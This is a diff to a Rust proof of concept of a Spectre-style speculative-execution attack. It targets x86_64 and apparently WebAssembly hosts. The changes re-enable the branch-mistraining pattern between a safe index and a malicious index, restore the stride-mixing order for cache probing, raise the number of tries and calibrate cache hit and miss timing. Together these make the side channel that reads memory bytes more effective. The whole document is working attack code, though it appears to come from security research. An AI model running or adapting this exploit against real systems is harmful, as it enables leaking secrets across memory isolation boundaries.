@@ -7,7 +7,7 @@ use std::arch::x86_64::_mm_clflush;
 #[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_mm_mfence;
 #[cfg(all(target_arch = "x86_64"))]
-use std::arch::x86_64::_rdtsc;
+use crate::_rdtsc;
 use std::io::Write;
 
 // In case of wasm target, then this is imported from the host
@@ -53,7 +53,7 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
     for i in 0..256 {
         scores[i] = 0;
     }
-    let tries = std::env::var("TRIES").unwrap_or("5000".to_string());
+    let tries = std::env::var("TRIES").unwrap_or("10000".to_string());
     let tries = tries.parse::<u64>().unwrap();
     unsafe {
         _mm_mfence();
@@ -87,22 +87,22 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
         // Here we access the line to measure the threshold of the cache hit
         #[cfg(all(target_arch = "wasm32"))]
         for j in 0..100 {
-            /*let location = if (j + 1) % 10 != 0 {
+            let location = if (j + 1) % 10 != 0 {
                 safe_index as usize
             } else {
                 malicious_x as usize
-            };*/
+            };
 
             // Call the victim code outside this binary
             unsafe {
-                victim_code(malicious_x as u32);
+                victim_code(location as u32);
             }
         }
         #[cfg(feature = "tracing")]
         println!("Measuring time now");
         for j in 0..256 {
             // To avoid stride caching
-            let mix_i = j; //((j * 167) + 13) & 255;
+            let mix_i = ((j * 167) + 13) & 255;
 
             let addr = &array_for_prediction[mix_i * STRIDE as usize] as *const u8;
             #[cfg(feature = "tracing")]
@@ -161,8 +161,8 @@ fn read_memory_byte(malicious_x: usize, hit: u64, miss: u64) -> ([u64; 2], [u64;
 #[no_mangle]
 pub fn predict(pad: usize) {
     for j in 0..11 {
-        let (hit, miss) = reproduction::get_cache_time(&array_for_prediction);
-        #[cfg(feature = "tracing")]
+        let (hit, miss) = reproduction::get_cache_time(&array_for_prediction, 1000000);
+        // #[cfg(feature = "tracing")]
         println!("Hit {} Miss {}", hit, miss);
 
         let (score, value) = read_memory_byte(j + pad, hit, miss);
